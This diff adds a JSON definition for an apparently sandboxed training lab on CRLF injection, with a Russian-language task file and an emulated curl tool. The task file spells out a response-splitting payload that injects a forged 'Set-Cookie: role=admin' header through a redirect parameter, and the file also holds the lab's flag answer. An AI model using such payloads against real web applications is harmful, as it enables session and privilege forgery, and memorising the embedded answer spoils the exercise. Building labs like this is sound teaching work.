@@ -1,0 +1,42 @@
+{
+  "id": "web-header-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{crlf_r3sp0ns3_sp1lt_c00k13}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: CRLF-инъекция\n\nЭндпоинт /go?next= копирует next в заголовок Location без фильтрации CRLF.\nДобейся, чтобы сервер вернул подделанную куку с ролью admin, и прочитай её значение.\n\n1. Убедись, что next отражается в заголовке:\n   curl -sI 'https://app.target/go?next=/dashboard'\n2. Вставь CRLF и свой заголовок:\n   curl -sI 'https://app.target/go?next=%2Fdashboard%0d%0aSet-Cookie:%20role=admin'\n3. В ответе появится Set-Cookie со значением флага — запиши его в found.txt и набери check.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/go)",
+      "cases": [
+        {
+          "match": "go\\?next=/dashboard$",
+          "example": "-sI '.../go?next=/dashboard'",
+          "output": "HTTP/1.1 302 Found\nLocation: /dashboard\n"
+        },
+        {
+          "match": "%0d%0aSet-Cookie|%0D%0ASet-Cookie",
+          "example": "-sI '.../go?next=/dashboard%0d%0aSet-Cookie:%20role=admin'",
+          "output": "HTTP/1.1 302 Found\nLocation: /dashboard\nSet-Cookie: role=nto{crlf_r3sp0ns3_sp1lt_c00k13}\n"
+        },
+        {
+          "match": "next=",
+          "example": "-sI '.../go?next=/dashboard'",
+          "output": "HTTP/1.1 302 Found\nLocation: /dashboard\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только указанный эндпоинт.\n"
+    }
+  }
+}
